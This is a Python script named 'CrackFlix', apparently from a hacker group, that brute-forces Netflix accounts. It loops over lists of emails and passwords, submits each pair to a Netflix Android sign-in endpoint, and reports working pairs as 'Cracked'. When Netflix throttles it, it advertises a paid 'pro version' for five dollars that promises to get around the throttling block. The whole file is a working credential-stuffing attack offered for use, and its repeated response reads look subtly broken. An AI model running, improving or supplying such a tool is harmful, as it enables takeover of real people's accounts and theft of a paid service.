#!/usr/bin/python
#########################
buy = '''
########~ Blocked ur ip :( ~######
# r u want pro version ? 5$ [Bitcoin/Paypal]
1 - Without Limit Block from NF Server
2 - With Multithreading
############Tell_ME###############
# Twitter: @_1337r00t            #
# Email: 1337r00t@1337leaks.info #
##################################
Wait !....
'''
import urllib2,urllib,os,re,platform# Python 2.x
#########################
def login(myemail,mypass):
	post = urllib.urlencode({'email':myemail,'password':mypass,'secureNetflixId':'v=2','netflixId':'v=2'})
	request = urllib2.Request("https://android.prod.cloud.netflix.com/android/samurai/config?path=['signInVerify']&appVersion=6.0.0", data=post)
	response = urllib2.urlopen(request)
	if '"mode":"memberHome"' in response.read():
		return("Cracked -> ("+myemail+":"+mypass+")")
	else:
		if 'throttling_failure' in response.read():
			return(buy)
		else:
			if '"unrecognized_email_consumption_only"' in response.read():
				return("Not Registered -> ("+myemail+")")
			else:
				return("("+myemail+":"+mypass+") -> Is Incorrect")
###########
if __name__ == "__main__":
	sys = platform.system()
	if 'Linux' in sys:
		os.system('clear')
	if 'Windows' in sys:
		os.system('cls')
	print('''
	==================================
	|    CrackFlix [Free Version]    |
	|     Brute Force [NetFlix]      |
	|--------------------------------|
	| CoDeD By 1337r00t (@_1337r00t) |
	---------------------------------|
	{    Gz: Members of BlackFox's   }
	---------------------------------|
	How Are you dude ?
	=====Be Cool======
	''')
	version = re.findall(r'^[\w\.-]', platform.python_version())
	if '2' in version:
		emails = raw_input("List Of Emails => ")
		passs = raw_input("List Of Passwords => ")
	if '3' in version:
		emails = str(input("List Of Emails => "))
		passs = str(input("List Of Passwords => "))
	############
	loop_email = open(emails,'r').read().splitlines()
	loop_pass = open(passs,'r').read().splitlines()
	thread_pool = []
	for email in loop_email:
		for password in loop_pass:
			print(login(email,password))
